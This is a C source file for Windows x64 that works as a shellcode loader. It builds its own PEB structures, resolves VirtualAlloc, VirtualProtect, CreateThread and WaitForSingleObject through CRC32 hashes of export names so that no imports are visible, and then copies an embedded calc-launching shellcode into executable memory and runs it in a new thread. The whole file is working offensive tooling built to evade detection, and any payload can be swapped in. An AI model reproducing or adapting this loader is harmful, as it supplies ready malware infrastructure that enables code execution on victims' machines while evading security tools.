#include <windows.h>
#include <stdint.h>
#include <intrin.h>

// =============================================================
// [1] MANUAL STRUCT DEFINITIONS
// =============================================================
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    void* EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    void* DllBase;
    void* EntryPoint;
    ULONG SizeOfImage;
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

typedef struct _MY_PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union {
        BOOLEAN BitField;
        struct {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PMY_PEB_LDR_DATA Ldr; 
} MY_PEB, *PMY_PEB;

// =============================================================
// [2] MINI-CRT (Standard Lib Replacements)
// =============================================================
void* malloc(size_t size) {
    return HeapAlloc(GetProcessHeap(), 0, size);
}

void free(void* ptr) {
    if (ptr) HeapFree(GetProcessHeap(), 0, ptr);
}

int tolower(int c) {
    if (c >= 'A' && c <= 'Z') return c + 32;
    return c;
}

int toupper(int c) {
    if (c >= 'a' && c <= 'z') return c - 32;
    return c;
}

int memcmp(const void* ptr1, const void* ptr2, size_t num) {
    const unsigned char* p1 = (const unsigned char*)ptr1;
    const unsigned char* p2 = (const unsigned char*)ptr2;
    for (size_t i = 0; i < num; i++) {
        if (p1[i] != p2[i]) {
            return p1[i] - p2[i];
        }
    }
    return 0;
}

// =============================================================
// [3] TYPEDEFS
// =============================================================
typedef LPVOID (WINAPI *PfnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL   (WINAPI *PfnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef HANDLE (WINAPI *PfnCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD  (WINAPI *PfnWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);

// =============================================================
// [4] SHELLCODE (x64 Calc)
// =============================================================
unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00";

// =============================================================
// [5] INJECTED ALGORITHM
// =============================================================
#include <stddef.h> // Required for size_t
#include <stdint.h> // Required for uint32_t

// The pre-computed CRC32 table, derived directly from the Python code.
// Declared static const to ensure it's read-only and has internal linkage.
static const uint32_t crc32_table[256] = {
    0, 79764919, 159529838, 222504665, 319059676, 398814059, 445009330, 507990021, 638119352, 583659535, 797628118, 726387553, 890018660, 835552979, 1015980042, 944750013, 1276238704, 1221641927, 1167319070, 1095957929, 1595256236, 1540665371, 1452775106, 1381403509, 1780037320, 1859660671, 1671105958, 1733955601, 2031960084, 2111593891, 1889500026, 1952343757, 2552477408, 2632100695, 2443283854, 2506133561, 2334638140, 2414271883, 2191915858, 2254759653, 3190512472, 3135915759, 3081330742, 3009969537, 2905550212, 2850959411, 2762807018, 2691435357, 3560074640, 3505614887, 3719321342, 3648080713, 3342211916, 3287746299, 3467911202, 3396681109, 4063920168, 4143685023, 4223187782, 4286162673, 3779000052, 3858754371, 3904687514, 3967668269, 881225847, 809987520, 1023691545, 969234094, 662832811, 591600412, 771767749, 717299826, 311336399, 374308984, 453813921, 533576470, 25881363, 88864420, 134795389, 214552010, 2023205639, 2086057648, 1897238633, 1976864222, 1804852699, 1867694188, 1645340341, 1724971778, 1587496639, 1516133128, 1461550545, 1406951526, 1302016099, 1230646740, 1142491917, 1087903418, 2896545431, 2825181984, 2770861561, 2716262478, 3215044683, 3143675388, 3055782693, 3001194130, 2326604591, 2389456536, 2200899649, 2280525302, 2578013683, 2640855108, 2418763421, 2498394922, 3769900519, 3832873040, 3912640137, 3992402750, 4088425275, 4151408268, 4197601365, 4277358050, 3334271071, 3263032808, 3476998961, 3422541446, 3585640067, 3514407732, 3694837229, 3640369242, 1762451694, 1842216281, 1619975040, 1682949687, 2047383090, 2127137669, 1938468188, 2001449195, 1325665622, 1271206113, 1183200824, 1111960463, 1543535498, 1489069629, 1434599652, 1363369299, 622672798, 568075817, 748617968, 677256519, 907627842, 853037301, 1067152940, 995781531, 51762726, 131386257, 177728840, 240578815, 269590778, 349224269, 429104020, 491947555, 4046411278, 4126034873, 4172115296, 4234965207, 3794477266, 3874110821, 3953728444, 4016571915, 3609705398, 3555108353, 3735388376, 3664026991, 3290680682, 3236090077, 3449943556, 3378572211, 3174993278, 3120533705, 3032266256, 2961025959, 2923101090, 2868635157, 2813903052, 2742672763, 2604032198, 2683796849, 2461293480, 2524268063, 2284983834, 2364738477, 2175806836, 2238787779, 1569362073, 1498123566, 1409854455, 1355396672, 1317987909, 1246755826, 1192025387, 1137557660, 2072149281, 2135122070, 1912620623, 1992383480, 1753615357, 1816598090, 1627664531, 1707420964, 295390185, 358241886, 404320391, 483945776, 43990325, 106832002, 186451547, 266083308, 932423249, 861060070, 1041341759, 986742920, 613929101, 542559546, 756411363, 701822548, 3316196985, 3244833742, 3425377559, 3370778784, 3601682597, 3530312978, 3744426955, 3689838204, 3819031489, 3881883254, 3928223919, 4007849240, 4037393693, 4100235434, 4180117107, 4259748804, 2310601993, 2373574846, 2151335527, 2231098320, 2596047829, 2659030626, 2470359227, 2550115596, 2947551409, 2876312838, 2788305887, 2733848168, 3165939309, 3094707162, 3040238851, 2985771188
};

// Function to compute the bzip2 version of CRC32 hash.
// The function signature strictly adheres to 'uint32_t hash(const unsigned char* data, size_t len)'.
uint32_t hash(const unsigned char* data, size_t len) {
    uint32_t result = 0xffffffff; // Initialize result with all bits set (0xFFFFFFFF)
    size_t i;

    // Iterate over each byte of the input data
    for (i = 0; i < len; ++i) {
        // Calculate the next result based on the current byte and the CRC table.
        // 1. Extract the most significant byte of 'result': (result >> 24) & 0xff
        //    The '& 0xff' explicitly masks the result to an 8-bit value, matching Python's behavior.
        // 2. XOR this extracted byte with the current data byte: (unsigned int)data[i] ^ ...
        //    Casting 'data[i]' to (unsigned int) ensures that the byte value is treated as an unsigned integer
        //    before the XOR operation, preventing any potential sign extension issues if 'char' were used,
        //    and explicitly adhering to the requirement.
        // 3. Use the result of this XOR as an index into the pre-computed 'crc32_table'.
        // 4. XOR the value retrieved from the table with 'result' shifted left by 8 bits: (result << 8)
        //    For 'uint32_t', left shift operations naturally wrap around, effectively mimicking Python's
        //    '& 0xffffffff' masking for intermediate calculations.
        result = crc32_table[(unsigned int)data[i] ^ ((result >> 24) & 0xff)] ^ (result << 8);
    }

    // Perform the final XOR with 0xffffffff.
    // The Python code also applies '& 0xffffffff' here, which is redundant for a 'uint32_t' return type
    // as the value is already guaranteed to be within 32 bits due to 'uint32_t' arithmetic.
    return result ^ 0xffffffff;
}

// =============================================================
// [6] RESOLVER LOGIC
// =============================================================
void* ResolveApi(uint32_t targetHash) {
    #ifndef _WIN64
        return NULL; 
    #endif

    MY_PEB* peb = (MY_PEB*)__readgsqword(0x60);
    MY_PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* curr = head->Flink;

    while (curr != head) {
        MY_LDR_DATA_TABLE_ENTRY* entry = (MY_LDR_DATA_TABLE_ENTRY*)CONTAINING_RECORD(curr, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        
        if (entry->DllBase) {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)entry->DllBase;
            if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
                PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)entry->DllBase + dos->e_lfanew);
                
                if (nt->Signature == IMAGE_NT_SIGNATURE && 
                    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0) {
                    
                    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)entry->DllBase + 
                        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                    
                    DWORD* names = (DWORD*)((BYTE*)entry->DllBase + exp->AddressOfNames);
                    WORD* ordinals = (WORD*)((BYTE*)entry->DllBase + exp->AddressOfNameOrdinals);
                    DWORD* funcs = (DWORD*)((BYTE*)entry->DllBase + exp->AddressOfFunctions);

                    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                        char* name = (char*)((BYTE*)entry->DllBase + names[i]);
                        
                        size_t len = 0;
                        while(name[len]) len++;

                        uint32_t currentHash = hash((unsigned char*)name, len);
                        
                        if (currentHash == targetHash) {
                            return (void*)((BYTE*)entry->DllBase + funcs[ordinals[i]]);
                        }
                    }
                }
            }
        }
        curr = curr->Flink;
    }
    return NULL;
}

// =============================================================
// [7] CUSTOM ENTRY POINT
// =============================================================
void WINAPI EntryPoint(void) {
    uint32_t h_VirtualAlloc = 0x67A48853;
    uint32_t h_VirtualProtect = 0xE3DA4BA;
    uint32_t h_CreateThread = 0x2FEBE156;
    uint32_t h_WaitForSingleObject = 0x66FE8A2A;
    
    // Resolve
    PfnVirtualAlloc pVirtualAlloc = (PfnVirtualAlloc)ResolveApi(h_VirtualAlloc);
    if (!pVirtualAlloc) ExitProcess(1);

    PfnVirtualProtect pVirtualProtect = (PfnVirtualProtect)ResolveApi(h_VirtualProtect);
    if (!pVirtualProtect) ExitProcess(2);

    PfnCreateThread pCreateThread = (PfnCreateThread)ResolveApi(h_CreateThread);
    if (!pCreateThread) ExitProcess(3);

    PfnWaitForSingleObject pWaitForSingleObject = (PfnWaitForSingleObject)ResolveApi(h_WaitForSingleObject);
    if (!pWaitForSingleObject) ExitProcess(4);

    // Allocate
    void* exec_mem = pVirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) ExitProcess(5);

    // Copy
    unsigned char* src = buf;
    unsigned char* dst = (unsigned char*)exec_mem;
    for (int i = 0; i < sizeof(buf); i++) {
        dst[i] = src[i];
    }

    // Protect
    DWORD oldProtect;
    if (!pVirtualProtect(exec_mem, sizeof(buf), PAGE_EXECUTE_READ, &oldProtect)) {
         ExitProcess(6);
    }

    // Thread
    HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (!hThread) ExitProcess(7);

    // Wait
    pWaitForSingleObject(hThread, 0xFFFFFFFF);
    
    ExitProcess(0);
}